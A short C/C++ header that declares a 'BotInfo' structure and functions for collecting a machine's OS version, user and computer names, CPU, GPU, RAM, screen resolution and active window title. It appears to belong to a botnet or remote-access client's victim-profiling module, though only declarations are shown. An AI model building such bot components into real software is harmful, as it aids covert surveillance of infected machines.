#pragma once

#include "../Includes/Common.h"

struct OsVer
{
	DWORD dwMajor;
	DWORD dwMinor;
	DWORD dwBuild;
	BOOL isX64;
};

struct BotInfo
{
	OsVer osVer;
	wchar_t userName[MAX_PATH * sizeof(wchar_t)];
	wchar_t compName[MAX_PATH * sizeof(wchar_t)];
	wchar_t cpuName[MAX_PATH * sizeof(wchar_t)];
	wchar_t gpuName[MAX_PATH * sizeof(wchar_t)];
	DWORD ramAmount;
	wchar_t screenRes[MAX_PATH];
	wchar_t activeWindow[MAX_PATH * sizeof(wchar_t)];
};

OsVer GetOsVer();
void GetUsernameW(wchar_t* userName);
void GetComputernameW(wchar_t* compName);
void GetCpuName(wchar_t* cpuName);
void GetGpuName(wchar_t* gpuName);
DWORD GetAviableRam();
void GetScreenResolution(wchar_t* screenResolution);
void GetActiveWindow(wchar_t* activeWindow);
BotInfo* GetBotInfo();